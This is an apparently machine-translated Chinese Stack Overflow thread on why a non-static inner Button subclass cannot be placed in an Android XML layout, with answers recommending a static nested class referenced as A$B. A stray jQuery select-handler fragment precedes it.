<option value="MostViewed">MostViewed</option> </select> 
```

查询：

```
$("select").change(function () {

      $("select option:selected").each(function () {
            str = $(this).text();
          });        

    })
    .change(); 
```

# java - Android：内部类错误

> ID：16013994
> 
> 赞同：0
> 
> 时间：2013-04-15T11:26:32.770
> 
> 标签：java, android, class, extends

我正在 Android 中开发应用程序并遇到问题。我有两个类 A 和 B。它们的代码如下（例如）：

```
public class A extends View {
//declaration of constructors
...
    public class B extends Button {
    //declaration of constructors
    }
} 
```

我尝试在设计器的 xml 中添加一个 B 类，但我收到一个错误，它什么也没添加。

```
<com.example.myproject.A.B
android:is="@+id/B1"
android:layout_wight="100dp"
android:layout_height="100dp"
.../> 
```

什么是可能的错误以及如何使上面显示的类在 xml 设计器中没有错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:30:16.653

您不能使用这些类，因为创建的实例`B`首先需要引用`A`。您要么制作`B`课程`static`并`A`使用：

```
<view
   class="com.example.myproject.A$B"
   android:is="@+id/B1"
   android:layout_wight="100dp"
   android:layout_height="100dp"
/> 
```

或者您重新考虑当前的类层次结构。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:33:17.813

你的代码应该是这样的：

```
public class A extends View {
//declaration of constructors
...
    public static class B extends Button {
    //declaration of constructors
    }
} 
```

和布局：

```
<view class="com.example.myproject.A$B"
    android:id="@+id/B1"
    android:layout_wight="100dp"
    android:layout_height="100dp"
    .../> 
```

这里最重要的`B`是`static`嵌套类，而不仅仅是内部类。如果您没有外部类的实例，则无法实例化内部类，这就是`A`您的情况。